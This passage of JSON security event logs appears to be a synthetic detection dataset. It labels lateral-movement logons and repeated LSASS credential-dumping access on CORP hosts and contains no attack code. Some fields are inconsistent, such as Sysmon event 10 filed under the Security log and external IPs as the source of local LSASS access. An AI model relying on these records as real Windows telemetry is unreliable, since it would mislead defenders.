    "_time": "2024-01-01T04:20:44",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "admin",
    "src_ip": "10.0.0.5",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: admin logged onto WS-IT-05 from DC-01"
  },
  {
    "_time": "2024-01-01T04:22:44",
    "source": "WinEventLog:Security",
    "host": "WS-IT-05",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "adavis",
    "src_ip": "192.168.1.101",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: adavis logged onto WS-HR-02 from WS-IT-05"
  },
  {
    "_time": "2024-01-01T04:23:21",
    "source": "WinEventLog:Security",
    "host": "WS-IT-05",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "jsmith",
    "src_ip": "10.0.1.12",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: jsmith logged onto SRV-WEB-01 from WS-IT-05"
  },
  {
    "_time": "2024-01-01T04:25:10",
    "source": "WinEventLog:Security",
    "host": "SRV-WEB-01",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "clee",
    "src_ip": "10.0.0.5",
    "dest_host": "WS-HR-02",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: clee logged onto WS-HR-02 from SRV-WEB-01"
  },
  {
    "_time": "2024-01-01T04:25:34",
    "source": "WinEventLog:Security",
    "host": "WS-HR-02",
    "EventCode": 4648,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "kthomas",
    "src_ip": "10.0.0.5",
    "dest_host": "WS-FINANCE-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: kthomas logged onto WS-FINANCE-01 from WS-HR-02"
  },
  {
    "_time": "2024-01-01T04:26:33",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "njones",
    "src_ip": "10.0.2.34",
    "dest_host": "SRV-WEB-01",
    "domain": "CORP",
    "logon_type": 3,
    "message": "Lateral movement: njones logged onto SRV-WEB-01 from DC-01"
  },
  {
    "_time": "2024-01-01T04:28:29",
    "source": "WinEventLog:Security",
    "host": "WS-HR-02",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "admin",
    "src_ip": "10.0.0.5",
    "dest_host": "DC-01",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: admin logged onto DC-01 from WS-HR-02"
  },
  {
    "_time": "2024-01-01T04:29:23",
    "source": "WinEventLog:Security",
    "host": "LAPTOP-EXEC-03",
    "EventCode": 4624,
    "event_type": "lateral_movement",
    "attack_category": "lateral_movement",
    "user": "adavis",
    "src_ip": "192.168.1.50",
    "dest_host": "WS-IT-05",
    "domain": "CORP",
    "logon_type": 10,
    "message": "Lateral movement: adavis logged onto WS-IT-05 from LAPTOP-EXEC-03"
  },
  {
    "_time": "2024-01-01T04:30:22",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "svc_backup",
    "src_ip": "198.54.117.200",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by svc_backup - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:31:19",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "77.91.68.33",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:31:39",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "svc_backup",
    "src_ip": "185.56.80.65",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by svc_backup - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:32:02",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "jsmith",
    "src_ip": "103.97.125.220",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by jsmith - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:33:09",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "198.54.117.200",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:34:03",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "svc_backup",
    "src_ip": "77.91.68.33",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by svc_backup - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:34:48",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "77.91.68.33",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:35:44",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "194.165.16.78",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:37:11",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "194.165.16.78",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:37:29",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "jsmith",
    "src_ip": "77.91.68.33",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by jsmith - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:38:51",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "jsmith",
    "src_ip": "185.56.80.65",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by jsmith - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:39:48",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "svc_backup",
    "src_ip": "185.56.80.65",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by svc_backup - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:40:48",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "svc_backup",
    "src_ip": "91.108.4.12",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by svc_backup - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:41:01",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "77.91.68.33",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:42:22",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "jsmith",
    "src_ip": "198.54.117.200",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by jsmith - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:42:59",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "45.142.212.100",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:43:24",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "jsmith",
    "src_ip": "194.165.16.78",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by jsmith - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:44:30",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "jsmith",
    "src_ip": "91.108.4.12",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by jsmith - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:45:50",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "194.165.16.78",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:46:22",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "svc_backup",
    "src_ip": "45.142.212.100",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by svc_backup - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:46:49",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "jsmith",
    "src_ip": "185.56.80.65",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by jsmith - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:48:09",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "194.165.16.78",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:49:37",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "jsmith",
    "src_ip": "77.91.68.33",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by jsmith - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:50:48",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "91.108.4.12",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:51:14",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "svc_backup",
    "src_ip": "198.54.117.200",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by svc_backup - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:52:30",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "svc_backup",
    "src_ip": "194.165.16.78",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by svc_backup - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:53:35",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "194.165.16.78",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:54:23",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "jsmith",
    "src_ip": "45.142.212.100",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by jsmith - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:55:17",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "103.97.125.220",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:55:52",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "103.97.125.220",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:57:20",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "194.165.16.78",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:57:51",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "185.220.101.45",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:58:11",
    "source": "WinEventLog:Security",
    "host": "SRV-SQL-01",
    "EventCode": 4656,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "jsmith",
    "src_ip": "77.91.68.33",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by jsmith - potential credential dumping"
  },
  {
    "_time": "2024-01-01T04:59:40",
    "source": "WinEventLog:Security",
    "host": "DC-01",
    "EventCode": 10,
    "event_type": "credential_dumping",
    "attack_category": "credential_dumping",
    "user": "backdoor_admin",
    "src_ip": "103.97.125.220",
    "dest_host": "DC-01",
    "domain": "CORP",
    "target_process": "lsass.exe",
    "access_mask": "0x1010",
    "message": "LSASS memory access by backdoor_admin - potential credential dumping"
  },
